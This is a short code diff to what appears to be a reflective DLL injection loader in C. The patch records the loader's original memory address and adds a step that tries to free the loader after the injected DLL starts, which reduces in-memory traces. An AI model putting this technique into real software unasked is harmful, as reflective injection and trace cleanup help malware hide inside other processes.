@@ -27,6 +27,7 @@
 //===============================================================================================//
 #include "stdafx.h"
 #include "ReflectiveLoader.h"
+#include "ReflectiveFree.h"
 //===============================================================================================//
 // Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
 HINSTANCE hAppInstance = NULL;
@@ -74,6 +75,7 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID)
 
 	// the initial location of this image in memory
 	ULONG_PTR uiLibraryAddress;
+	ULONG_PTR uiLibraryAddressOrig;
 	// the kernels base address and later this images newly loaded base address
 	ULONG_PTR uiBaseAddress;
 
@@ -116,6 +118,7 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID)
 		}
 		uiLibraryAddress--;
 	}
+	uiLibraryAddressOrig = uiLibraryAddress;
 
 	// STEP 1: process the kernels exports for the functions our loader needs...
 
@@ -529,6 +532,9 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID)
 #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
 	// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
 	((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter);
+	
+	// Free the loader itself
+	((DLLMAIN)uiValueA)((HINSTANCE)uiLibraryAddressOrig, DLL_PROCESS_DETACH, NULL);
 #else
 	// if we are injecting an DLL via a stub we call DllMain with no parameter
 	((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL);
